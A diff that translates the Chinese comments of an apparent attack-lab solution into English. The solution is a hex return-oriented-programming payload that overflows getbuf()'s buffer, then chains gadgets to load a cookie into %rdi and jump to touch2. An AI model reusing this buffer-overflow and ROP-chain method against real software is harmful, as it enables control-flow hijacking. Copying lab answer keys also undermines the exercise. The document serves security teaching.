@@ -1,4 +1,4 @@
-/* 填充 getbuf() 的缓冲区 */
+/* Fill getbuf()'s buffer */
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
@@ -6,13 +6,13 @@
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
-/* gadget1 的地址 */
-/* 将 cookie pop 入 %rax */
+/* gadget1's address */
+/* pop the cookie into %rax */
 47 8b 80 00 00 00 00 00
-/* cookie 在此处 */
+/* cookie goes here */
 92 38 f1 4d 00 00 00 00
-/* gadget2 的地址 */
-/* 将 cookie 从 %rax 转移入 %rdi */
+/* gadget2's address */
+/* move the cookie from %rax into %rdi */
 23 8b 80 00 00 00 00 00
-/* touch2 的地址 */
+/* touch2's address */
 60 89 80 00 00 00 00 00
